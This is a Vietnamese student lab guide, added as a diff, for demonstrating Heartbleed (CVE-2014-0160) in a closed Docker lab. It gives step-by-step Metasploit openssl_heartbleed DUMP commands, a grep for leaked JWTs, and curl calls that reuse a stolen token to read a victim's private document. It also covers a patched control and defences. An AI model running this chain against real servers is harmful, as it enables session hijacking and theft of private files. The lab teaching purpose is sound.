@@ -1,0 +1,332 @@
+HƯỚNG DẪN CÀI ĐẶT & VẬN HÀNH LAB 2 — HEARTBLEED (CVE-2014-0160)
+Nhóm 09 - An toàn mạng (N02) - Người phụ trách: TV2 Phan Đức (HTTPS/TLS)
+==================================================================
+
+MỤC TIÊU
+--------
+Khai thác lỗi Heartbleed (CVE-2014-0160) trong OpenSSL để TRỘM SESSION
+(JWT) THẬT của một người dùng đang đăng nhập vào backend quản lý tài
+liệu của nhóm, rồi dùng session trộm được để ĐỌC một tài liệu PRIVATE
+của nạn nhân — không cần biết username/password.
+
+Điểm quan trọng để nói với thầy: lỗi nằm ở OpenSSL (tầng TLS), KHÔNG
+nằm trong code Java của backend. Backend giữ nguyên 100%, không sửa gì.
+
+Toàn bộ các bước nghiệp vụ (đăng ký, đăng nhập, upload tài liệu, dùng
+token trộm được) DEMO THỦ CÔNG qua web UI thật / lệnh `curl` / công cụ
+Metasploit để thầy xem trực tiếp — KHÔNG dùng script tự động.
+
+
+KIẾN TRÚC LAB
+-------------
+    Victim (trình duyệt) / Attacker (Kali)
+         |  (HTTPS, cổng 8443 hoặc 8444)
+         v
+    proxy-vulnerable (OpenSSL 1.0.1f - DÍNH lỗi, cổng 8443)
+    proxy-patched    (OpenSSL 1.0.1g - ĐÃ VÁ,  cổng 8444, để đối chứng)
+         |  (HTTP thường, nội bộ)
+         v
+    backend  (Spring Boot THẬT của nhóm, không sửa code)
+         |
+         v
+       MySQL (riêng cho lab, không đụng tới Server thật đang chạy)
+
+Toàn bộ chạy trong Docker, nằm trong thư mục:
+    F:\AnToanMang\lab2-heartbleed\
+
+Cấu trúc thư mục:
+    lab2-heartbleed/
+    ├── backend.Dockerfile   Build backend thật (context = managedocuments/managedocuments)
+    ├── docker-compose.yml   mysql + backend + proxy-vulnerable (8443) + proxy-patched (8444)
+    ├── proxy/
+    │   ├── Dockerfile       Build OpenSSL (ARG OPENSSL_VERSION) + stunnel link với nó
+    │   └── stunnel.conf     accept 8443 (TLS) -> connect backend:8080 (HTTP)
+    ├── victim/, exploit/    (các file .py trong đây KHÔNG DÙNG NỮA — chỉ để tham khảo)
+    └── README.md            Tài liệu kỹ thuật đầy đủ hơn file này
+
+
+ĐỊA CHỈ IP/HOST DÙNG TRONG LAB — RẤT QUAN TRỌNG, ĐỌC KỸ TRƯỚC KHI LÀM
+------------------------------------------------------------------------
+Toàn bộ hướng dẫn dưới đây dùng ký hiệu "<HOST>" thay cho địa chỉ thật.
+"<HOST>" KHÁC NHAU tùy bạn đang thử ở đâu và AI đang gọi (chính máy
+đang chạy Docker, hay 1 máy khác như Kali):
+
+  (A) THỬ TRÊN WINDOWS, gọi TỪ CHÍNH MÁY WINDOWS đó
+      (mở trình duyệt trên Windows, hoặc chạy curl trong cmd/PowerShell
+      trên chính Windows đang chạy "docker compose up"):
+          <HOST> = localhost     (hoặc 127.0.0.1)
+      Ví dụ: https://localhost:8443/
+
+  (B) THỬ TRÊN WINDOWS, nhưng attacker ở KALI (máy/VM khác)
+      Kali KHÔNG hiểu "localhost" là máy Windows — phải dùng đúng IP
+      mạng mà Kali nhìn thấy Windows. Theo cấu hình mạng lab đã đặt
+      trước đó (card "VMware Network Adapter VMnet3" trên Windows,
+      mạng host-only 192.168.56.0/24):
+          <HOST> = 192.168.56.1   (IP của Windows trên mạng lab)
+      Ví dụ lệnh Metasploit: set RHOSTS 192.168.56.1
+      (Docker Desktop map cổng 8443/8444 ra TẤT CẢ card mạng của
+      Windows, nên Kali gọi vào 192.168.56.1:8443 là vào đúng lab.)
+
+  (C) SAU KHI ĐEM LAB SANG CHẠY TRÊN VM SERVER (192.168.56.30)
+      Khi đó toàn bộ thư mục lab2-heartbleed/ chạy trên Server, nên
+      MỌI máy gọi vào (Windows, Client, Kali) đều dùng chung:
+          <HOST> = 192.168.56.30
+      Đây là địa chỉ chuẩn, dùng lâu dài cho buổi demo thật trước thầy
+      (đúng với mô hình 3 máy Client/Kali/Server đã dựng).
+
+=> Khi đọc "https://<HOST>:8443/..." hay "set RHOSTS <HOST>" ở các
+   bước dưới, tự thay theo đúng trường hợp (A)/(B)/(C) bạn đang làm.
+
+
+THIẾT LẬP MẠNG CHO THÀNH VIÊN KHÁC (nếu máy bạn CHƯA có IP 192.168.56.x)
+---------------------------------------------------------------------------
+Mục này dành cho bạn nào muốn tự thử lab này trên máy Windows của mình
+(theo đúng trường hợp B ở trên: lab chạy trên Windows, attacker chạy
+trên 1 VM Kali khác). Cần có sẵn VMware Workstation/Player và 1 máy ảo
+Kali Linux. Làm theo đúng thứ tự sau:
+
+BƯỚC N1 — Tạo mạng host-only riêng cho lab trong VMware
+  1. Mở VMware Workstation/Player -> menu Edit -> Virtual Network Editor
+     (nếu không mở được, bấm phải vào icon VMware -> "Run as administrator"
+     rồi mở lại, vì cần quyền Admin để sửa mạng).
+  2. Bấm "Change Settings" (góc dưới, cần quyền Admin) nếu các nút đang
+     bị mờ/khóa.
+  3. Chọn 1 dòng "VMnetX" còn trống (nhóm mình dùng VMnet3 — nếu máy bạn
+     VMnet3 đã bị dùng cho việc khác, chọn 1 VMnet khác còn trống, chỉ
+     cần nhớ số để làm nhất quán ở các bước sau).
+  4. Tích chọn:
+       - "Host-only" (KHÔNG chọn NAT, KHÔNG chọn Bridged)
+       - Subnet IP: 192.168.56.0   Subnet mask: 255.255.255.0
+       - BỎ TÍCH "Use local DHCP service to distribute IP address to VMs"
+         (lab dùng IP tĩnh, không cần DHCP)
+  5. Bấm "Apply" rồi "OK".
+
+BƯỚC N2 — Đặt IP tĩnh cho máy Windows trên mạng vừa tạo
+  1. Mở Windows Settings -> Network & Internet -> Advanced network settings
+     (hoặc gõ "ncpa.cpl" vào Run để mở nhanh danh sách card mạng).
+  2. Tìm card tên "VMware Network Adapter VMnetX" (X là số bạn chọn ở
+     Bước N1, ví dụ VMnet3).
+  3. Bấm vào card đó -> Edit (hoặc chuột phải -> Properties trong ncpa.cpl)
+     -> chọn "Internet Protocol Version 4 (TCP/IPv4)" -> Properties.
+  4. Chọn "Use the following IP address":
+       IP address:   192.168.56.1
+       Subnet mask:  255.255.255.0
+       (để trống Default gateway và DNS — mạng lab kín, không cần)
+  5. OK để lưu. Đây chính là <HOST> dùng ở trường hợp (B) phía trên.
+
+BƯỚC N3 — Gắn máy ảo Kali vào đúng mạng này + đặt IP tĩnh cho Kali
+  1. Tắt máy Kali (nếu đang chạy). Vào VM Settings của Kali -> Network
+     Adapter -> chọn "Custom: Specific virtual network" -> chọn đúng
+     "VMnetX" vừa tạo ở Bước N1 (nếu Kali cần cả Internet để cập nhật
+     Metasploit, thêm 1 Network Adapter thứ 2 để ở "NAT" — giữ adapter
+     đầu/chính cho mạng lab).
+  2. Mở Kali, vào Settings -> Network (hoặc dùng nmcli), tìm đúng card
+     tương ứng với adapter vừa gắn vào VMnetX, đặt IP tĩnh:
+       IP:          192.168.56.20   (hoặc bất kỳ IP trống khác trong
+                     192.168.56.2 - 192.168.56.254, tránh .1 vì Windows
+                     đã dùng)
+       Netmask:     255.255.255.0
+       Gateway/DNS: để trống (không cần cho mạng lab kín)
+     Ví dụ dùng nmcli (thay "eth1" bằng tên card đúng của Kali — xem
+     bằng lệnh "ip -br a"):
+       nmcli con add type ethernet ifname eth1 con-name lab \
+         ip4 192.168.56.20/24
+       nmcli con up lab
+
+BƯỚC N4 — Kiểm tra 2 máy thấy nhau
+  Trên Windows (cmd):          ping 192.168.56.20
+  Trên Kali (terminal):        ping 192.168.56.1
+  Cả 2 lệnh phải có phản hồi (reply). Nếu không, kiểm tra lại Bước N1-N3
+  (đúng VMnet, đúng IP, tường lửa Windows có thể cần cho phép ICMP —
+  thường không cần chỉnh gì thêm vì Windows thường tự cho phép ping
+  trong mạng nội bộ/private).
+
+Sau khi xong 4 bước trên, máy bạn đã sẵn sàng — tiếp tục làm theo các
+bước bên dưới (BƯỚC 1 trở đi), dùng <HOST> = 192.168.56.1 cho trường
+hợp (B) (Metasploit từ Kali) và <HOST> = localhost cho trường hợp (A)
+(thao tác ngay trên Windows).
+
+
+YÊU CẦU TRƯỚC KHI BẮT ĐẦU
+--------------------------
+1. Server đã cài Docker + Docker Compose.
+2. Server có Internet (qua card NAT) để build (tải mã nguồn OpenSSL/
+   stunnel, build jar Spring Boot bằng Maven).
+3. Máy Kali có sẵn Metasploit Framework (msfconsole).
+4. Trình duyệt trên máy Client để đăng ký/đăng nhập/upload qua web UI.
+5. Có curl (sẵn trên Kali/Ubuntu) để gọi API bằng JWT trộm được.
+6. Wireshark/tcpdump (tùy chọn) để bắt gói tin minh chứng.
+7. Toàn bộ chỉ chạy trong mạng lab kín 192.168.56.0/24 của nhóm.
+
+
+BƯỚC 1 — KHỞI ĐỘNG LAB
+----------------------
+    cd lab2-heartbleed
+    docker compose up --build
+
+Lần đầu build mất vài phút. Chờ tới khi backend log "Started
+ManagedocumentsApplication" và 2 proxy log "Configuration successful".
+
+Sẵn sàng 2 cổng:
+  - https://<HOST>:8443  -> proxy DÍNH lỗi (OpenSSL 1.0.1f)
+  - https://<HOST>:8444  -> proxy ĐÃ VÁ   (OpenSSL 1.0.1g, đối chứng)
+
+Web UI thật của backend mở ngay tại https://<HOST>:8443/ (same-
+origin) — chấp nhận cảnh báo chứng chỉ tự ký trên trình duyệt.
+
+
+BƯỚC 2 — (THỦ CÔNG, TRÌNH DUYỆT) NẠN NHÂN ĐĂNG KÝ + ĐĂNG NHẬP + UPLOAD TÀI LIỆU PRIVATE
+-----------------------------------------------------------------------------------------
+1. Mở https://<HOST>:8443/ trên trình duyệt (nếu làm trên chính Windows,
+   <HOST> = localhost; xem bảng "ĐỊA CHỈ IP/HOST" ở trên).
+2. Đăng ký tài khoản nạn nhân, ví dụ: victim1 / Victim@123.
+3. Đăng nhập bằng tài khoản đó.
+4. Upload 1 file bất kỳ, TẮT "Công khai" (Public) -> để chế độ Private.
+5. Ghi lại ID của tài liệu vừa tạo (xem trong "Tài liệu của tôi").
+
+=> Chụp màn hình: upload thành công, tài liệu ở chế độ Private.
+
+
+BƯỚC 3 — (THỦ CÔNG) GIỮ SESSION NẠN NHÂN "SỐNG" TRONG LÚC ATTACKER TẤN CÔNG
+-----------------------------------------------------------------------------
+- Để tab trình duyệt của nạn nhân mở sẵn, đã đăng nhập.
+- Trong lúc Bước 4 chạy, bấm vài thao tác trên web (xem trang cá nhân,
+  danh sách tài liệu...) để JWT của nạn nhân tiếp tục được dùng tới —
+  tăng khả năng JWT đang nằm trong RAM của proxy khi attacker "nổ"
+  Heartbleed.
+
+
+BƯỚC 4 — (KALI, METASPLOIT) KHAI THÁC HEARTBLEED ĐỂ BẮT JWT
+--------------------------------------------------------------
+Mở terminal trên Kali:
+(Lưu ý: Kali là máy KHÁC, không hiểu "localhost" là Windows/Server —
+luôn dùng trường hợp (B) hoặc (C) ở bảng "ĐỊA CHỈ IP/HOST" phía trên,
+KHÔNG BAO GIỜ dùng "localhost" cho RHOSTS ở bước này.)
+
+    msfconsole -q
+    use auxiliary/scanner/ssl/openssl_heartbleed
+    set RHOSTS <HOST>
+    set RPORT 8443
+    set ACTION DUMP
+    set VERBOSE true
+    run
+
+- Module gửi Heartbeat giả mạo, đọc trộm RAM của tiến trình OpenSSL
+  trên proxy.
+- Metasploit lưu dữ liệu rò ra vào 1 file "loot" (đường dẫn in ra cuối
+  output, dạng ~/.msf4/loot/<timestamp>_<host>_openssl.heartble_<id>.bin).
+- Nếu lần đầu chưa trúng JWT (bộ nhớ ngẫu nhiên), chạy lại "run" vài
+  lần — xen kẽ với Bước 3 (bấm thao tác trên web nạn nhân).
+
+=> Chụp màn hình: output msfconsole cho thấy "Heartbeat response with
+   leak" + đường dẫn file loot.
+
+
+BƯỚC 5 — (KALI) TÌM JWT TRONG DỮ LIỆU RÒ RA
+-----------------------------------------------
+    grep -aoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' \
+      ~/.msf4/loot/<ten-file-loot>.bin
+
+JWT chuẩn luôn có dạng base64url.base64url.base64url, bắt đầu bằng
+"eyJ" (vì phần header JSON {"alg":...} encode base64 luôn cho tiền tố
+này) — lệnh grep trên tìm đúng mẫu đó trong file nhị phân.
+
+=> Chụp màn hình: chuỗi JWT tìm được, ghi lại dùng ở Bước 6. Nếu không
+   thấy gì, quay lại Bước 4 chạy "run" thêm vài lần.
+
+
+BƯỚC 6 — (THỦ CÔNG, CURL) DÙNG JWT TRỘM ĐƯỢC ĐỂ CHIẾM SESSION + ĐỌC TÀI LIỆU PRIVATE
+----------------------------------------------------------------------------------------
+Xác minh token hợp lệ (không cần username/password):
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://<HOST>:8443/api/auth/my-info
+
+=> Kết quả mong đợi: HTTP 200 + JSON thông tin tài khoản victim1.
+
+Bước hậu quả — đọc tài liệu riêng tư thật (thay <ID> bằng ID tài liệu
+ghi lại ở Bước 2):
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://<HOST>:8443/api/documents/<ID>
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://<HOST>:8443/api/documents/<ID>/download -o leaked_file
+
+=> Kết quả mong đợi: HTTP 200, lấy được metadata + file thật của tài
+   liệu Private.
+
+Đối chứng nhanh (không gửi token):
+
+    curl -sk https://<HOST>:8443/api/documents/<ID>
+
+=> Phải trả 401 UNAUTHORIZED — chứng minh backend phân quyền đúng,
+   chỉ Heartbleed mới vượt qua được.
+
+=> Chụp màn hình: output của cả 3 lệnh curl trên.
+
+
+BƯỚC 7 — MÀN ĐỐI CHỨNG OPENSSL ĐÃ VÁ
+----------------------------------------
+Lặp lại Bước 4-5 nhưng đổi RPORT thành 8444:
+
+    set RPORT 8444
+    run
+
+=> Kết quả mong đợi: không rò được gì (không có "leak" trong output;
+   grep file loot cũng không ra JWT).
+
+=> Kết luận: chỉ phiên bản OpenSSL thay đổi (1.0.1f -> 1.0.1g) mà kết
+   quả đảo ngược hoàn toàn, trong khi backend và toàn bộ luồng nghiệp
+   vụ còn lại giữ nguyên 100% -> điểm yếu nằm ở OpenSSL, không phải ở
+   code backend.
+
+
+DANH SÁCH ẢNH CẦN NỘP
+----------------------
+[ ] Bước 2: upload tài liệu thành công ở chế độ Private trên web UI, ghi lại ID.
+[ ] Bước 4: msfconsole chạy openssl_heartbleed ACTION DUMP, có leak + đường dẫn loot.
+[ ] (Tùy chọn) Wireshark: gói Heartbeat response bất thường trên cổng 8443.
+[ ] Bước 5: lệnh grep tìm ra chuỗi JWT trong file loot.
+[ ] Bước 6: curl /api/auth/my-info trả về thông tin tài khoản nạn nhân.
+[ ] Bước 6: curl /api/documents/<ID> + /download lấy được tài liệu Private.
+[ ] Bước 6 (đối chứng): curl không có token -> 401 UNAUTHORIZED.
+[ ] Bước 7: cùng thao tác Metasploit nhắm cổng 8444 (đã vá) -> không rò được gì.
+
+
+BIỆN PHÁP PHÒNG THỦ (ghi vào báo cáo)
+--------------------------------------
+- Luôn cập nhật thư viện mã hóa (OpenSSL) lên bản vá mới nhất — lỗi
+  tầng thấp (giao thức/thư viện TLS) không thể phòng tránh bằng cấu
+  hình hay code ứng dụng phía trên.
+- Sau khi vá, thu hồi toàn bộ session đang hoạt động và cấp lại chứng
+  chỉ/khóa riêng đã dùng trên proxy dính lỗi.
+- Thời gian sống JWT ngắn (jwt.valid-duration) giúp giảm thiệt hại.
+- Giám sát/cảnh báo các gói Heartbeat bất thường bằng IDS nếu triển
+  khai thực tế.
+
+
+THAM KHẢO API (phòng khi cần gõ tay)
+--------------------------------------
+Đăng ký:        POST /api/auth/register    JSON {username, email, password, fullName}
+Đăng nhập:      POST /api/auth/login       JSON {username, password} -> data.accessToken
+Thông tin tài khoản: GET /api/auth/my-info      Header Authorization: Bearer <token>
+Danh mục (public):   GET /api/categories        (không cần token)
+Upload tài liệu:     POST /api/documents (multipart) field title/description/categoryId/isPublic/file
+Xem chi tiết:        GET /api/documents/{id}         Header Authorization: Bearer <token> (nếu private)
+Tải file:            GET /api/documents/{id}/download Header Authorization: Bearer <token> (nếu private)
+
+
+LƯU Ý / XỬ LÝ LỖI THƯỜNG GẶP
+------------------------------
+- Toàn bộ thử nghiệm CHỈ thực hiện trong lab kín của nhóm (mạng
+  192.168.56.0/24, container riêng, tách biệt với Server thật đang
+  chạy production). Không chạy nhắm vào hệ thống nào khác.
+- Tài khoản nạn nhân tự đăng ký ở Bước 2 chỉ là tài khoản demo.
+- Nếu Metasploit không rò được JWT sau nhiều lần "run": kiểm tra
+  container đã chạy đúng chưa (docker compose ps), và đảm bảo nạn nhân
+  đang thực sự tương tác với web (Bước 3) đúng lúc attacker chạy module.
+- Nếu docker compose build lỗi ở bước tải mã nguồn: kiểm tra Internet
+  và các URL tải openssl-1.0.1g.tar.gz trong proxy/Dockerfile còn tồn
+  tại không.
+- Chi tiết kỹ thuật đầy đủ hơn xem README.md cùng thư mục.
